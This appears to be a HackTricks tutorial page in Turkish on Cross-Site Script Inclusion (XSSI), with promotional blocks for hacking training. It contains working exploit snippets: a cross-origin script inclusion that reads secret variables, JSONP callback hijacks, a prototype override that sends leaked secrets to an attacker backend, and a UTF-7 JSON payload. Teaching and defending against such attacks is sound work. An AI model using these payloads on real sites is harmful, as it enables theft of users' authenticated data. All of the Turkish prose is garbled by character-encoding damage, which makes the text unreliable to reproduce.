# XSSI (Cross-Site Script Inclusion)

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan kahraman seviyesine yÃ¼kseltin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>


## Temel Bilgiler

**Cross-Site Script Inclusion (XSSI)**, HTML'deki `script` etiketinin doÄŸasÄ±ndan kaynaklanan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. DiÄŸer kaynaklarÄ±n Ã§oÄŸunun aksine, **AynÄ± KÃ¶ken PolitikasÄ± (SOP)**'na tabi olmayan betikler, farklÄ± etki alanlarÄ±ndan dahil edilebilir. Bu davranÄ±ÅŸ, farklÄ± sunucularda barÄ±ndÄ±rÄ±lan kÃ¼tÃ¼phanelerin ve diÄŸer kaynaklarÄ±n kullanÄ±mÄ±nÄ± kolaylaÅŸtÄ±rmayÄ± amaÃ§lamaktadÄ±r, ancak aynÄ± zamanda potansiyel bir gÃ¼venlik riski de oluÅŸturur.

### **XSSI**'nin Temel Ã–zellikleri:
- **SOP'nin AtlatÄ±lmasÄ±**: Betikler, etki alanlarÄ± arasÄ±nda dahil edilebilmelerine izin veren **AynÄ± KÃ¶ken PolitikasÄ±**'ndan muaf tutulur.
- **Veri SÄ±zdÄ±rma**: Bir saldÄ±rgan, `script` etiketi aracÄ±lÄ±ÄŸÄ±yla yÃ¼klenen verileri okumak iÃ§in bu davranÄ±ÅŸÄ± istismar edebilir.
- **Dinamik JavaScript/JSONP Ãœzerindeki Etkisi**: **XSSI**, Ã¶zellikle dinamik JavaScript veya **JSON ile Dolgulu (JSONP)** iÃ§in Ã¶nemlidir. Bu teknolojiler genellikle kimlik doÄŸrulamasÄ± iÃ§in "ortam yetkisi" bilgilerini (Ã¶rneÄŸin Ã§erezler) kullanÄ±r. FarklÄ± bir sunucuya bir betik isteÄŸi yapÄ±ldÄ±ÄŸÄ±nda, bu kimlik bilgileri (Ã¶rneÄŸin Ã§erezler) otomatik olarak isteÄŸe dahil edilir.
- **Kimlik DoÄŸrulama Jetonu SÄ±zÄ±ntÄ±sÄ±**: Bir saldÄ±rgan, bir kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nÄ± kendi kontrol ettikleri bir sunucudan bir betik istemeye kandÄ±rabilirse, bu isteklerdeki hassas bilgilere eriÅŸebilir.

### TÃ¼rler

1. **Statik JavaScript** - Bu, geleneksel XSSI'nin temsilcisidir.
2. **Kimlik DoÄŸrulamalÄ± Statik JavaScript** - Bu tÃ¼r, eriÅŸim iÃ§in kimlik doÄŸrulamasÄ± gerektirir ve diÄŸer tÃ¼rlerden farklÄ±dÄ±r.
3. **Dinamik JavaScript** - Ä°Ã§erik dinamik olarak oluÅŸturan JavaScript'i iÃ§erir.
4. **JavaScript DÄ±ÅŸÄ±** - DoÄŸrudan JavaScript iÃ§ermeyen gÃ¼venlik aÃ§Ä±klarÄ±nÄ± ifade eder.

**AÅŸaÄŸÄ±daki bilgiler, [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414) adresindeki Ã¶zetidir. Daha fazla ayrÄ±ntÄ± iÃ§in kontrol edin.


### DÃ¼zenli XSSI
Bu yaklaÅŸÄ±mda, Ã¶zel bilgiler kÃ¼resel olarak eriÅŸilebilir bir JavaScript dosyasÄ±na gÃ¶mÃ¼lÃ¼dÃ¼r. SaldÄ±rganlar, dosya okuma, anahtar kelime aramalarÄ± veya dÃ¼zenli ifadeler gibi yÃ¶ntemler kullanarak bu dosyalarÄ± tespit edebilir. Bulunan Ã¶zel bilgileri iÃ§eren betik, yetkisiz eriÅŸime izin vererek kÃ¶tÃ¼ amaÃ§lÄ± iÃ§eriÄŸe dahil edilebilir. AÅŸaÄŸÄ±da bir Ã¶rnek istismar tekniÄŸi gÃ¶sterilmektedir:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dinamik-JavaScript-tabanlÄ±-XSSI ve Kimlik DoÄŸrulama-JavaScript-XSSI
Bu tÃ¼r XSSI saldÄ±rÄ±larÄ±, kullanÄ±cÄ±nÄ±n isteÄŸine yanÄ±t olarak betiÄŸe dinamik olarak eklenen gizli bilgileri iÃ§erir. AlgÄ±lama, Ã§erezlerle ve Ã§erezler olmadan istekler gÃ¶ndererek ve yanÄ±tlarÄ± karÅŸÄ±laÅŸtÄ±rarak gerÃ§ekleÅŸtirilebilir. Bilgiler farklÄ±lÄ±k gÃ¶steriyorsa, gizli bilgilerin varlÄ±ÄŸÄ±nÄ± gÃ¶sterebilir. Bu iÅŸlem, [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp eklentisi gibi araÃ§lar kullanÄ±larak otomatikleÅŸtirilebilir.

Gizli veriler bir global deÄŸiÅŸkende depolanÄ±yorsa, DÃ¼zenli XSSI'de kullanÄ±lan yÃ¶ntemlere benzer yÃ¶ntemlerle istismar edilebilir. Ancak, gizli veriler bir JSONP yanÄ±tÄ±nda yer alÄ±yorsa, saldÄ±rganlar geri Ã§aÄŸÄ±rma iÅŸlevini ele geÃ§irerek bilgileri alabilir. Bu, ya global nesneleri manipÃ¼le ederek ya da JSONP yanÄ±tÄ± tarafÄ±ndan yÃ¼rÃ¼tÃ¼lecek bir iÅŸlevi kurarak yapÄ±labilir, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
DeÄŸiÅŸkenlerin global ad alanÄ±nda bulunmadÄ±ÄŸÄ± durumlarda, bazen *prototype bozulmasÄ±* istismar edilebilir. Bu teknik, JavaScript'in tasarÄ±mÄ±ndan yararlanÄ±r, burada kod yorumlamasÄ±, Ã§aÄŸrÄ±lan Ã¶zelliÄŸi bulmak iÃ§in prototip zincirini gezme iÅŸlemi iÃ§erir. `Array`'Ä±n `slice` gibi belirli fonksiyonlarÄ± geÃ§ersiz kÄ±larak, saldÄ±rganlar global olmayan deÄŸiÅŸkenlere eriÅŸebilir ve sÄ±zdÄ±rabilir:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
### Non-Script-XSSI
Takeshi Terada'nÄ±n araÅŸtÄ±rmasÄ±, CSV gibi Non-Script dosyalarÄ±nÄ±n, bir `script` etiketi iÃ§inde kaynak olarak dahil edilerek cross-origin olarak sÄ±zdÄ±rÄ±ldÄ±ÄŸÄ± baÅŸka bir XSSI formunu tanÄ±tÄ±r. Google adres defterinin tamamÄ±nÄ± okumak iÃ§in yapÄ±lan Jeremiah Grossman'Ä±n 2006 saldÄ±rÄ±sÄ± ve Joe Walker'Ä±n 2007 JSON veri sÄ±zÄ±ntÄ±sÄ± gibi tarihsel XSSI Ã¶rnekleri, bu tehditlerin ciddiyetini vurgular. AyrÄ±ca, Gareth Heyes, belirli tarayÄ±cÄ±larda etkili olan JSON formatÄ±ndan kaÃ§mak ve komut dosyalarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in UTF-7 kodlu JSON iÃ§eren bir saldÄ±rÄ± varyantÄ±nÄ± aÃ§Ä±klar:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** isterseniz, [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
